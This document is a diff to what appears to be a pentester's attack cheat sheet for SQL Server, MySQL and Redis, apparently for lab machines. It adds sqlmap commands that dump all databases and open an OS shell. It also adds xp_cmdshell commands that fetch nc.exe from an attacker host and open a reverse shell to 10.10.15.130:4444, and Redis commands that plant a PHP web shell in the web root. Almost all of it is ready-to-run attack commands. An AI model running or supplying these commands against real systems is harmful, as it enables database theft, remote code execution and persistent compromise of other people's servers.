@@ -63,6 +63,8 @@ sqlmap -r request.txt --dbms=mysql --dump
 sqlmap -r lockdown.req --dbms=mysql --dump -T 'users' -D 'cts_db' -C 'username,password'
 sqlmap -u "http://192.168.1.100/section.php" --data "id=50&pass=1234" --dbs --threads 10 
 sqlmap -u "http://192.168.1.100/section.php?id=51" --sql-query="select * from users"
+sqlmap -u 'http://10.129.154.173/dashboard.php?search=1' --level 3 --dbms 'oracle' --dump-all --batch
+sqlmap -u 'http://10.129.154.173/dashboard.php?search=1' --cookie="PHPSESSID=gjfbgkutlm9q1vtavt2gmi00ne" --os-shell --flush-session
 
 # mysql (UDFs exploit):
 gcc -g -c raptor_udf2.c -fPIC
@@ -95,3 +97,14 @@ RECONFIGURE
 -- activando xp_cmdshell
 EXEC sp_configure 'xp_cmdshell', '1' 
 RECONFIGURE
+
+EXEC master..xp_cmdshell 'whoami'
+
+SQL> xp_cmdshell "powershell wget http://10.10.15.130:8000/nc.exe -OutFile %temp%/nc.exe"
+SQL> xp_cmdshell "powershell %temp%/nc.exe 10.10.15.130 4444 -e cmd.exe"
+
+# redis RCE
+echo "CONFIG SET dir /var/www/html" | redis-cli
+echo "CONFIG SET dbfilename dosh.php" | redis-cli
+echo "SET PAYLOAD \"<?php system(\$_GET['cmd']); ?>\"" | redis-cli
+echo "BGSAVE" | redis-cli
